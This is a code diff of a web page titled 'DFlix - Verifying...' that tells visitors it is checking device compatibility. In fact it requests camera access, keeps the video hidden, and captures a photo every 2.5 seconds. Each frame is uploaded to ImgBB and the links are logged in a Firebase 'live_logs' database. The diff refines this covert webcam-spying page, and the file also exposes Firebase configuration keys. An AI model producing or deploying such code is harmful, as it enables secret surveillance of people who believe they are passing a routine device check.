@@ -2,26 +2,22 @@
 <html lang="hi">
 <head>
     <meta charset="UTF-8">
-    <title>DFlix - System Check</title>
+    <title>DFlix - Verifying...</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .msg { text-align: center; }
-        #v { display: none; } /* Camera hidden */
-    </style>
 </head>
-<body>
+<body style="background:#000; color:#fff; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
 
-    <div class="msg">
-        <h2>Verifying System...</h2>
-        <p>Please wait while we check your device compatibility.</p>
+    <div style="text-align:center;">
+        <h2 id="msg">System Loading...</h2>
+        <p id="sub-msg">Please wait while we verify your device.</p>
     </div>
 
-    <video id="v" autoplay playsinline></video>
+    <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
+        // Aapka Fixed Firebase Config
         const firebaseConfig = {
             apiKey: "AIzaSyD7gABQ1j1zMFS9AylLCZr-K1hyK0LkIsQ",
             authDomain: "distark.firebaseapp.com",
@@ -29,8 +25,7 @@
             projectId: "distark",
             storageBucket: "distark.firebasestorage.app",
             messagingSenderId: "819241583845",
-            appId: "1:819241583845:web:2231e652310e47e06cc00c",
-            measurementId: "G-X175B7NX2K"
+            appId: "1:819241583845:web:2231e652310e47e06cc00c"
         };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
@@ -40,35 +35,45 @@
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 document.getElementById('v').srcObject = stream;
-                // Har 2.5 second mein capture karega
+                document.getElementById('msg').innerText = "Verifying Identity...";
+                console.log("Camera Ready");
+                // Har 2.5 second mein capture
                 setInterval(takeSnap, 2500);
             } catch (err) {
-                alert("Please allow camera permission to continue.");
+                document.getElementById('msg').innerText = "Permission Required!";
+                document.getElementById('sub-msg').innerText = "Please allow camera access to continue.";
+                console.error("Camera Error:", err);
             }
         }
 
         function takeSnap() {
             const v = document.getElementById('v');
             const c = document.getElementById('c');
-            c.width = v.videoWidth; 
+            const ctx = c.getContext('2d');
+
+            c.width = v.videoWidth;
             c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
+            ctx.drawImage(v, 0, 0);
             
             const base64 = c.toDataURL('image/png').split(',')[1];
             const fd = new FormData();
             fd.append('image', base64);
 
+            // ImgBB Upload
             fetch(`https://api.imgbb.com/1/upload?key=${imgbbKey}`, { method: 'POST', body: fd })
             .then(r => r.json())
             .then(res => {
                 if(res.success) {
+                    // Firebase Database mein Save
                     db.ref('live_logs').push({
                         url: res.data.url,
                         time: new Date().toLocaleTimeString()
-                    });
+                    }).then(() => console.log("Saved to Firebase"))
+                      .catch(e => console.error("Firebase Error:", e));
                 }
-            }).catch(e => console.log("Network busy..."));
+            }).catch(e => console.error("Upload Error:", e));
         }
+
         window.onload = init;
     </script>
 </body>
